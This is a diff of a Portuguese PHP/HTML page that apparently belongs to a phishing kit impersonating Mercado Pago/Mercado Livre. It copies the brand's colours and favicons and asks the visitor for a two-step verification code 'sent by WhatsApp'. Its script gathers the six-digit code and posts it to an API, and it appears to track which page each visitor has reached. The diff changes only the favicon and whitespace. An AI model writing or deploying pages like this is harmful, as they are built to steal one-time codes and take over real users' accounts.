@@ -21,7 +21,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código que te enviamos por WhatsApp</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     <style>
         :root {
             --cor-amarela: #ffe600;
@@ -66,7 +66,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
     <main class="main-content">
         <div class="content-wrapper">
-            
+
             <div class="left-column">
                 <span class="session-start-label">VERIFICAÇÃO EM 2 ETAPAS</span>
                 <h1 class="main-title">Insira o código que te enviamos por WhatsApp</h1>
@@ -81,7 +81,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         <a href="index.php">Trocar conta</a>
                     </div>
                 </div>
-                
+
                 <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
@@ -136,13 +136,13 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         function startTimer() {
             let seconds = 50; // Duração do contador
             timerElement.style.color = 'var(--cor-texto-secundaria)';
-            
+
             // Função que atualiza o timer a cada segundo
             function updateTimer() {
                 const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                 const secs = String(seconds % 60).padStart(2, '0');
                 timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
-                
+
                 if (seconds > 0) {
                     seconds--;
                 } else {
@@ -151,7 +151,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar código</a>`;
                 }
             }
-            
+
             clearInterval(countdownInterval); // Limpa qualquer timer anterior
             updateTimer(); // Roda uma vez imediatamente
             countdownInterval = setInterval(updateTimer, 1000); // Inicia o contador
@@ -166,11 +166,11 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
         // Inicia o contador assim que a página carrega
         document.addEventListener('DOMContentLoaded', startTimer);
-        
+
         // LÓGICA 3: Envio do código para a API ao submeter o formulário
         async function handleFormSubmit(event) {
             event.preventDefault(); // Previne o envio padrão do formulário
-            
+
             // Junta os 6 dígitos em uma única string
             const code = inputs.map(input => input.value).join('');
 
@@ -182,9 +182,9 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ sms_code: code })
                     });
-                    
+
                     const result = await response.json();
-                    
+
                     if (result.success) {
                         alert('Código recebido com sucesso!');
                         // Você pode redirecionar o usuário aqui se quiser
@@ -232,7 +232,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop();
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
